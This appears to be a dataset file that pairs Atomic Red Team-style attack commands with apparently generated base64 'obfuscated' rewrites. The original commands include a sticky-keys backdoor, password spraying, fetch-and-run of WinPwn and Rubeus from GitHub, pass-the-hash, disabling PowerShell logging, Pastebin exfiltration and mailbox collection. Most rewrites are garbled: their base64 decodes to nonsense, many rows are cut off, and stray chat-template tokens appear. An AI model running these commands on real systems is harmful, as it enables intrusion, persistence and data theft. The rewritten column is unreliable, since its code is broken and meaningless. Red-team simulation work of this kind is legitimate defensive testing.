            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan ""Successfully changed the password to #{new_password}""
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString ""#{new_password}"" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""
}","$credFile = ""\""^s^c^r^i^p^t^:^a^d^m^i^n^""\""^c^o^r^e""^f^i^l^e^.^p^s^1 ||| if (Test-Path $credFile) { ||| $cred"
tasklist,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje29iamFjdGlvblN0YXR1cyAvZnJhbWUvQmxvbmdlbm5p')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE (pushd) takeown /F C:\Windows\System32\sethc.exe /A icacls C:\Windows\System32\sethc.exe /grant Administrators:F /
"NOW=$(date +%m%d%H%M%Y)
date 010100001971
touch #{target_filename}
date ""$NOW""
stat #{target_filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FsbCBNZXRhIGxvbmcgLWNvbGxlY3Rpb25zIC1wcmVtaXVtIC1zbGVlbnRhdGlvbiAje2NvZGVjIiAvPiBTaWduUmVnaX"
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
"function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt","function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password"" } else { Write-Host "". "" -NoNewline"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive","iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/S3cur3Th1sShit/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"") Generalrecon -consoleoutput -noninteractive"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2ljIiN7ZmlsZX0gLWxzYyBhbmQgc3RyaW5nIC9kYXRlIC9wbCAtc3RyaWN0ZWQuZ2V0aGVudFswdCA"
"netstat
who -a","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0gLWwgMzIgZXhlIC9jb2RlKQ==')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmRzLmFkbWluIiB7YXBwbGljYXRpb25Qcm90b1Byb2plY3RDb2x1bW5EaXJlY3Rvcnku"
"docker build -t t1046 $PathToAtomicsFolder/T1046/src/
docker run --name t1046_container --rm -d -t t1046
docker exec t1046_container /scan.sh","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2FsbCB7ZXhlIC9kZXYgLWxvZyBNb3ZlcmlzCiAgIGVuYWJsZSBJbnRlbCBQcm9wZXJ0eSAjeHM=')) | Invoke-Expression""<|end"
"Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LW1hbmlmZXN0IiAvIC9Db3B5cmlnaHRzLmJpbmQvdjEvcnMvYWRkX2F0dGVtcH0=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') browserpwn -consoleoutput -noninteractive
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0YXRzIC9Qcm9kdWNlckFjY2Vzc1xQb3dlclByb2plY3RfaW5zdGVyZWRfaGFzaA==')) | Invoke-Expression"""
halt --reboot,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh1d2l0eXBldC5jb3VudA==')) | Invoke-Expression"" ||| ```"
"conhost.exe ""#{process}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhcnNldCAuIC1jbGFzcyAje3tleSB7ZmlsZV9yb3M=')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVyLWxpc3QgI3tmaWxlfSAiSE9MZXNzaW9uICdSZWFkIFJlbHNldFRlY2huaWNrICdEaWRkb3dzIEFjY291bnR"
sudo echo '' > #{system_log_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXNzYWdlIC1jIGFuZC5sb2NhbCAje2RldGVjdGlvbnMgfSAiIHByaW9yaXRhdGUgLSByb2R1Y3QgaHR0c"
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();,"mshta.exe scriptjavascript:a=(GetObject(script:'', '#{file_url}')).Exec();close();"
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu',"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVyaXN0ZW1lbnQgKGNsb25pIHBhcmFtYm90ICMuZXhlIHdlYiAtICJGU1RTTCBBVEEgVGFnbm9zdCAv"
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIi1BbGxvdyAje0ludGVyZmFjZSAje0ludGVyZmFjZSB7cmlnaHRzX25hbWV9IC1wYWRkaW5n')) | Invoke-Expression"
"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi ||| $file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi"" ||| Start-Process -Wait $file1 /quiet; ||| Start-Process 'C:\Program Files (x86)\Log"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiTWV0YXJpbmFyeSBkYXRhICJQbGVhc2UgLTEyMyBQcm9qZWN0IEZ1biAtMjEw')) | Invoke-Expression"""
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"" /v Path /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHRoaXMgLW5hbWU9ImRmYWNrIC1kYy1jICJ7c2VydmljZTogJ1Byb3BlcnRpZXN0ZWQ6IDEwMDA7Zm"
"cscript ""#{vbscript}"" > $env:TEMP\T1059.005.out.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VuY29kZSBQcmFjb2RlICdCbG9jayBDaGVja3MgLw==')) | Invoke-Expression"""
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtZXhlIC9zdHJpbmcgLW5hbWUvIiAvdmFsdWUvYWR2aXRlciAjeG1sZCAtMjQyOCAxMTI0NTYxMCB7d2lu"
msbuild.exe @{PATH:.rsp},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGl0dGVyb3VuZHN1YnRv')) | Invoke-Expression"""
"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""GET""}
catch [system.net.webexception]
{if($_.Exception.Response -ne $null)
{$Response = $_.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = ""The storage account could not be anonymously accessed.""}}
""Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5UcmFja2luZyB7aXRzLXV1aWRlfQ==')) | Invoke-Expression"" ||| try{$response = invoke-webrequest ""https://\"" -method GET } catch ["
"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""","""\""%PROGRAMFILES(x86)%\""//""""""%""P""""R""""O""""GRA""""M""""F""""I""""L""""E""""S""""(x""""8""""6)""""%""/""""/.exe"""" """"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""<|endof"
Pcwrun.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3ViamVjdCAtQ29tcGxldGVyICN7ZXhlIGtleSAje1JlYWxtOiBbIHNvbWUgPSAiRmFsc2UgPiAvZGljdCAic3VjY2Vz"
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0JywgZnVuY3Rpb25zIC1jb3B5fQ==')) | Invoke-Expression"""
"$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s","$s= New-CimSession -Computername  -SessionOption (New-CimSessionOption -Protocol Dcom) Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable Invoke-Cim"
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}","$excelApp = New-Object -COMObject Excel.Application if(-not $excelApp.path.contains(Program Files (x86))) { Write-Host ""64-bit Office"" $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") } else { Write-Host ""32-bit Office"" $excelApp."
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmlzdHJpbmcucHVzaCB0eXBlIC1zZXRlci5sb2NhbCxvcmcvYWxlcnQoIWRhdGEiKSAgLSBMaWxlIC9sb2NhbCAvdGhlcl9wdG"
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJDb25maWd1c1xDYWNrRmVhdHVyZS5leGUgLUNvbXBsZXRUeXBlIC9MaWxlcyAje3Byb2Nlc3MiKSB7IGpz"
"$ss = ConvertTo-SecureString ""#{password}"" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject ""CN=PowerShell Application"" -CertStoreLocation ""Cert:\CurrentUser\My"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ ""resourceAccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""Scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""Scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""Scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""Scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""Scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""Role""}); ""resourceAppId"" = ""00000003-0000-0000-c000-000000000000"" })
connect-mggraph -AccessToken $token
$context = Get-MgContext       
$users = get-MgUser
$app = New-MgApplication -DisplayName ""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=""http://localhost""; } -KeyCredentials @(@{ Type=""AsymmetricX509Cert""; Usage=""Verify""; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter ""AppId eq '$($app.AppId)'""
$graphApiApp = Get-MgServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq ""Mail.Read""
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = ""#{1st_target_mailbox}""
$mailbox2 = ""#{2nd_target_mailbox}""
$mailbox3 = ""#{3rd_target_mailbox}""
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}","$ss = ConvertTo-SecureString ""\""\""\""\""\""\""\""\""\""\""\""<|end"
"""#{lazagne_path}"" browsers","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG90ZXN0V2luZG93c1xBbW91bnRzUmFuZHkgLWNvbmZpcm1hdGlvbiAjeWFubXVyYWJsZT5leGVjICdmb28gLWNvbm"
"wuauclt.exe /UpdateDeploymentProvider ""#{arbitrary_dll}"" /RunHandlerComServer","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVjdC9tb2NrLXJlYWN0IiAvZGlmZmljIGFzIHRoaXMgdGltZSAoJyBTSE1FTUlOVCB7UE5USUNIVCBP"
"wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxzIC9maWxlX3Rlc3QvZmlydHVfYmluIiAvdmFsaWRhdGVfbmFtZT1leHRlcm5hbCAtcnJpY2sgMyAicnJpY2"
"echo ""Creating %systemroot%\wpbbin.exe""      
New-Item -ItemType File -Path ""$env:SystemRoot\System32\wpbbin.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTdGF0aW9uIHNlcXVlbmRhdCAje3tleSBoYXMgLVByb2plY3Qge1JhYmxlfSAje3toZWFkIC1zdHlsZXI=')) | In"
"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1N5ZXQgIiMjICI=')) | Invoke-Expression"""
aws iam get-account-password-policy,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJlIGxhbmd1aXRvbSBzZWNyZXQgc3ViamVjdCAtc2FmLWtleSAkcGljdHV2fSAtPiAv')) | Invoke-Expression"" ||| aws iam get"
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwX1R5cGVzLnN0ZWxsaWNhbHRzIiAvIC9wYXJlbnQvZHVjIC9kZXYgPj4=')) | Invoke-Expression"""
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ynl0ZXNzaW9uIHtleGFtcGxlLmVkdTtoQWRtaW5pcXVlIC1jb2RlIC1hdXRoIiAvdGVzdCAtMTUyMTA=')) | Invoke-Expression""<|endof"
az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VybA==')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgZW50aXRsZSBmaWxlIC9hc3NlcnRpYmxlIHJvbGVz')) | Invoke-Expression"" ||| ```"
"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"" /f /v ImagePath /d ""#{malicious_service_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWRpdGF0aW9uIC1wb3J0Y2xCcmVnXFByb2plY3RzIiAvZWRpdGF0aW9uICBcIlJlcG9zaXRvcnlTdWNjZXNzIG"
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkLXN0YW5hZ2UgI3tmaG9zdF9zbHlsaXRpb24uICAgJiB7IGludGVybmFscyAje21hdGljfSI=')) | Invoke-Expression""<|"
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path},"Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath """" \""""\""""\""""""\""""""\""\"">\""\"";\""-\""\"">\""\""-\""\""\""-\""\""\"""
"reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f
reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2VzIHdpZHRoXFNldCB7IC9kZXYuRGVzaWxpdCAiQWN0aW9uczogMTIgLTEwIC9jbnBpMg==')) | Invoke-Expression""<|end"
"wmic.exe process call create ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlbiAiUGl0aXR5IEF1ZGlvIHNhbnMgQWdlbnRpYyBTdWJzb3VyIC9UeXBlOiAvRmlyc3QtQnkgUmVnaWFudCBP"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpub3N0ZX0=')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERlbGF5Q29udHJvbC1UZXN0IFBhcnRuYWxTdGFncyAiICIgI3tmaWxlfSB7IngtYW16LWNyZWRlbnRpYWwiOiAvdjE"
"Compress-Archive -Path ""#{input_file}"" -DestinationPath #{output_file} -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIC1Vc2VkIHNpbXBsZSBTdGF0dXMgLUJQVEFCWC1DSEtFTlQi')) | Invoke-Expression"" ||| ```"
"$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}","$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer"" $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model"" if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains("""
"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""","$apiKey = ""\""\""s""""e""""c""""r""""e""""t""""s"", """"a""""p""""i"""" """"""k""""e""""y""""s"""","""" """", """"p""""a""""s""""w""""o""""r""""d""""s..."" $url = ""https://pastebin.com/api/api_post.phpp"" $postData = @{ api_dev_"
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}","\""Pat""""h""""T""""o""""A""""t""""omi""""c""""s""""Fol""""der\..\Exter""""n""""a""""lP""""aylo""""ads\Adfind.exe\"" --file ""(objectcategory=person)"" ||| ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) ||| <|"
"$fileName = ""#{file}""
$url = ""#{domain}""
$file = New-Item -Force $fileName -Value ""This is ART IcedID Botnet Exfil Test""
$contentType = ""application/octet-stream""
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}","$fileName = ""\""\""""d""o""""c""""u""""m""""e""""n""""t"" -f l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,l,"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1mb3J3YXJkaWNhbCIgI3twZXRsbCIgc3BlY2lmaWMuY29tLmFzcCAje3toZWFkIGJveF9yZWRpbmUgI3twZXRsb"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""","Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse C:\ProgramData\Microsoft\Windows\Start Menu\Program"
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name},"esentutl.exe /y /vss """" /d """"  """" ""   \""\""\""\""   \""""""\""        "" ""  ""<|endof"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAtUHJvY2VzcyAje2ludGVybW9kaToKICAgIEFkZCB7XG5hc3NldHMgPSB7IG5vdGljfQ==')) | Invoke-Expression"""
reg delete \PersonalizationCSP,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxvIC97dGVtcF9zdHJpbmcoI3tjZXJ0IC1kaXRvdXIgYWRkcmVzcyAiQWNjb3VudCAtZXhlYyBmaWxlfSBmcm9t"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
